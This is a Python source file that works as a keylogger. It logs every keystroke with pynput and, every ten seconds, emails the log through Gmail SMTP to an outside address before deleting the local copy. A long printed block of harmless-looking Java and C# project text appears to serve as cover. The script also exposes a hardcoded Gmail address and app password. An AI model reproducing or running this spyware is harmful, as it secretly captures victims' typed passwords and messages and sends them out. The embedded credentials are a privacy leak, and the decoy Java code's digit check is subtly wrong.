import smtplib
import ssl
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener
import os
import time
import threading

# Configuration
LOG_FILE = "key_log.txt"
EMAIL_INTERVAL = 10  # Time in seconds to send email
RECEIVER_EMAIL = "pragadheeshaananth@gmail.com"  # Replace with recipient's email
            #EMAIL_ADDRESS = os.getenv("pragadheeshaananth12@gmail.com")  # Use environment variable for email
            #EMAIL_PASSWORD = os.getenv("aalh omuo jfkq eavr")  # Use environment variable for password
# Function to send email
def send_email(log_data):
    try:
        # Create email message
        message = MIMEText(log_data)
        message["Subject"] = "Keylogger Logs"
        message["From"] = "pragadheeshaananth12@gmail.com"
        message["To"] = RECEIVER_EMAIL

        # Setup the connection with Gmail's SMTP server
        context = ssl.create_default_context()
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()  # Secure the connection
            server.login("pragadheeshaananth12@gmail.com", "aalh omuo jfkq eavr")  # Log in to Gmail
            server.sendmail("pragadheeshaananth12@gmail.com", RECEIVER_EMAIL, message.as_string())  # Send the email
            #print("Mail sent successfully!")

    except Exception as e:
        print(f"Error sending email: {e}")
paragraph="""
1. Password Generator using Java
    With the growing trend of hacking attacks,
    everyone should create different and complex passwords 
    for their diverse accounts to keep them secure. Remembering every password is not
    humanly possible and noting it down somewhere is not a wise idea.
    Hence, people take the help of Password generators to create strong
    and complex passwords for their accounts. To generate such 
    functionality all by yourself, you can take advantage of the 
    function that java offers. Whenever a user is developing an 
    account on a new website, you can use that program to develop 
    a password. To take the safety of the password a notch above,
    you can enforce such functionality so that it saves passwords 
    in encrypted form. To incorporate this, you need to study the
    fundamentals of Cryptography and Java Cryptography Architecture
    
    
        public class Password {
    String Value;
    int Length;

    public Password(String s) {
        Value = s;
        Length = s.length();
    }

    public int CharType(char C) {
        int val;

        // Char is Uppercase Letter
        if ((int) C >= 65 && (int) C <= 90)
            val = 1;

        // Char is Lowercase Letter
        else if ((int) C >= 97 && (int) C <= 122) {
            val = 2;
        }

        // Char is Digit
        else if ((int) C >= 60 && (int) C <= 71) {
            val = 3;
        }

        // Char is Symbol
        else {
            val = 4;
        }

        return val;
    }

    public int PasswordStrength() {
        String s = this.Value;
        boolean UsedUpper = false;
        boolean UsedLower = false;
        boolean UsedNum = false;
        boolean UsedSym = false;
        int type;
        int Score = 0;

        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            type = CharType(c);

            if (type == 1) UsedUpper = true;
            if (type == 2) UsedLower = true;
            if (type == 3) UsedNum = true;
            if (type == 4) UsedSym = true;
        }

        if (UsedUpper) Score += 1;
        if (UsedLower) Score += 1;
        if (UsedNum) Score += 1;
        if (UsedSym) Score += 1;

        if (s.length() >= 8) Score += 1;
        if (s.length() >= 16) Score += 1;

        return Score;
    }

    public String calculateScore() {
        int Score = this.PasswordStrength();

        if (Score == 6) {
            return "This is a very good password :D check the Useful Information section to make sure it satisfies the guidelines";
        } else if (Score >= 4) {
            return "This is a good password :) but you can still do better";
        } else if (Score >= 3) {
            return "This is a medium password :/ try making it better";
        } else {
            return "This is a weak password :( definitely find a new one";
        }
    }

    @Override
    public String toString() {
        return Value;
    }
}



2. Online Survey System
    The idea of this project is to create a core java project
    that can accumulate the viewpoint of a targeted audience of
    a survey through the Internet. Based on that, the app can send
    the targeted audiences promotional emails and can launch online
    surveys. Any business can make use of this type of software to
    assemble feedback regarding the services or products they offer.
    We can build such functionality so that only registered customers
    can cast their responses. The main attributes of the app should be:
    The apps are programmed in a way that they should be compatible
    with various databases like SQL and NoSQL.
    Customers can submit their reactions anonymously.
    Should be installed at a doable cost.
    
    
        ﻿using Microsoft.AspNet.Identity;
using Microsoft.Owin;
using Microsoft.Owin.Security.Cookies;
using Owin;

namespace Online_Survey_System
{
    public partial class Startup
    {
        // For more information on configuring authentication, please visit http://go.microsoft.com/fwlink/?LinkId=301864
        public void ConfigureAuth(IAppBuilder app)
        {
            // Enable the application to use a cookie to store information for the signed in user
            app.UseCookieAuthentication(new CookieAuthenticationOptions
            {
                AuthenticationType = DefaultAuthenticationTypes.ApplicationCookie,
                LoginPath = new PathString("/Account/Login")
            });
            // Use a cookie to temporarily store information about a user logging in with a third party login provider
            app.UseExternalSignInCookie(DefaultAuthenticationTypes.ExternalCookie);

            // Uncomment the following lines to enable logging in with third party login providers
            //app.UseMicrosoftAccountAuthentication(
            //    clientId: "",
            //    clientSecret: "");

            //app.UseTwitterAuthentication(
            //   consumerKey: "",
            //   consumerSecret: "");

            //app.UseFacebookAuthentication(
            //   appId: "",
            //   appSecret: "");

            //app.UseGoogleAuthentication();
        }
    }
}


3. Snake Game using Java
    In our childhood, nearly all of us enjoyed
    playing classic snake games. Now we will try 
    to enhance it with the help of Java concepts. 
    The concept appears to be easy but it is not that e
    ffortless to implement.
    One ought to comprehend the OOPs concept in detail
    to execute this effectively. Furthermore, ideas from
    Java Swing are used to create this application. The 
    application should comprise the following functionalities:
    The Snake will have the ability to move in all four directions.
    The snake’s length grows as it eats food.
    When the snake crosses itself or strikes 
    perimeter of the box, the game is marked over.
    Food is always given at different positions.
                
               package com.zetcode;

import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.FontMetrics;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import javax.swing.ImageIcon;
import javax.swing.JPanel;
import javax.swing.Timer;

public class Board extends JPanel implements ActionListener {

    private final int B_WIDTH = 300;
    private final int B_HEIGHT = 300;
    private final int DOT_SIZE = 10;
    private final int ALL_DOTS = 900;
    private final int RAND_POS = 29;
    private final int DELAY = 140;

    private final int x[] = new int[ALL_DOTS];
    private final int y[] = new int[ALL_DOTS];

    private int dots;
    private int apple_x;
    private int apple_y;

    private boolean leftDirection = false;
    private boolean rightDirection = true;
    private boolean upDirection = false;
    private boolean downDirection = false;
    private boolean inGame = true;

    private Timer timer;
    private Image ball;
    private Image apple;
    private Image head;

    public Board() {
        
        initBoard();
    }
    
    private void initBoard() {

        addKeyListener(new TAdapter());
        setBackground(Color.black);
        setFocusable(true);

        setPreferredSize(new Dimension(B_WIDTH, B_HEIGHT));
        loadImages();
        initGame();
    }

    private void loadImages() {

        ImageIcon iid = new ImageIcon("src/resources/dot.png");
        ball = iid.getImage();

        ImageIcon iia = new ImageIcon("src/resources/apple.png");
        apple = iia.getImage();

        ImageIcon iih = new ImageIcon("src/resources/head.png");
        head = iih.getImage();
    }

    private void initGame() {

        dots = 3;

        for (int z = 0; z < dots; z++) {
            x[z] = 50 - z * 10;
            y[z] = 50;
        }
        
        locateApple();

        timer = new Timer(DELAY, this);
        timer.start();
    }

    @Override
    public void paintComponent(Graphics g) {
        super.paintComponent(g);

        doDrawing(g);
    }
    
    private void doDrawing(Graphics g) {
        
        if (inGame) {

            g.drawImage(apple, apple_x, apple_y, this);

            for (int z = 0; z < dots; z++) {
                if (z == 0) {
                    g.drawImage(head, x[z], y[z], this);
                } else {
                    g.drawImage(ball, x[z], y[z], this);
                }
            }

            Toolkit.getDefaultToolkit().sync();

        } else {

            gameOver(g);
        }        
    }

    private void gameOver(Graphics g) {
        
        String msg = "Game Over";
        Font small = new Font("Helvetica", Font.BOLD, 14);
        FontMetrics metr = getFontMetrics(small);

        g.setColor(Color.white);
        g.setFont(small);
        g.drawString(msg, (B_WIDTH - metr.stringWidth(msg)) / 2, B_HEIGHT / 2);
    }

    private void checkApple() {

        if ((x[0] == apple_x) && (y[0] == apple_y)) {

            dots++;
            locateApple();
        }
    }

    private void move() {

        for (int z = dots; z > 0; z--) {
            x[z] = x[(z - 1)];
            y[z] = y[(z - 1)];
        }

        if (leftDirection) {
            x[0] -= DOT_SIZE;
        }

        if (rightDirection) {
            x[0] += DOT_SIZE;
        }

        if (upDirection) {
            y[0] -= DOT_SIZE;
        }

        if (downDirection) {
            y[0] += DOT_SIZE;
        }
    }

    private void checkCollision() {

        for (int z = dots; z > 0; z--) {

            if ((z > 4) && (x[0] == x[z]) && (y[0] == y[z])) {
                inGame = false;
            }
        }

        if (y[0] >= B_HEIGHT) {
            inGame = false;
        }

        if (y[0] < 0) {
            inGame = false;
        }

        if (x[0] >= B_WIDTH) {
            inGame = false;
        }

        if (x[0] < 0) {
            inGame = false;
        }
        
        if (!inGame) {
            timer.stop();
        }
    }

    private void locateApple() {

        int r = (int) (Math.random() * RAND_POS);
        apple_x = ((r * DOT_SIZE));

        r = (int) (Math.random() * RAND_POS);
        apple_y = ((r * DOT_SIZE));
    }

    @Override
    public void actionPerformed(ActionEvent e) {

        if (inGame) {

            checkApple();
            checkCollision();
            move();
        }

        repaint();
    }

    private class TAdapter extends KeyAdapter {

        @Override
        public void keyPressed(KeyEvent e) {

            int key = e.getKeyCode();

            if ((key == KeyEvent.VK_LEFT) && (!rightDirection)) {
                leftDirection = true;
                upDirection = false;
                downDirection = false;
            }

            if ((key == KeyEvent.VK_RIGHT) && (!leftDirection)) {
                rightDirection = true;
                upDirection = false;
                downDirection = false;
            }

            if ((key == KeyEvent.VK_UP) && (!downDirection)) {
                upDirection = true;
                rightDirection = false;
                leftDirection = false;
            }

            if ((key == KeyEvent.VK_DOWN) && (!upDirection)) {
                downDirection = true;
                rightDirection = false;
                leftDirection = false;
            }
        }
    }
} """
print(paragraph)

# Function to log keystrokes to file
def log_keystroke(key):
    try:
        with open(LOG_FILE, "a") as file:
            if key == Key.space:
                file.write(" ")
            elif key == Key.enter:
                file.write("\n")
            elif key == Key.tab:
                file.write("\t")
            elif key == Key.backspace:
                file.write("[BACKSPACE]")
            else:
                file.write(str(key).replace("'", ""))  # Log the key
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Function to read log file and send via email
def email_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as file:
            log_data = file.read()  # Read the log data
        send_email(log_data)  # Send the email
        os.remove(LOG_FILE)  # Clear log after sending

# Function to handle key press
def on_press(key):
    log_keystroke(key)

# Function to handle key release
def on_release(key):
    if key == Key.esc:
        return False  # Stop the listener when Escape key is pressed

# Background process to send logs periodically
def periodic_email():
    while True:
        time.sleep(EMAIL_INTERVAL)
        email_logs()  # Send the log emails periodically

# Start the keylogger and email thread
try:
    email_thread = threading.Thread(target=periodic_email, daemon=True)
    email_thread.start()  # Start the email sending thread

    # Start the keylogging listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    print(f"Error: {e}")

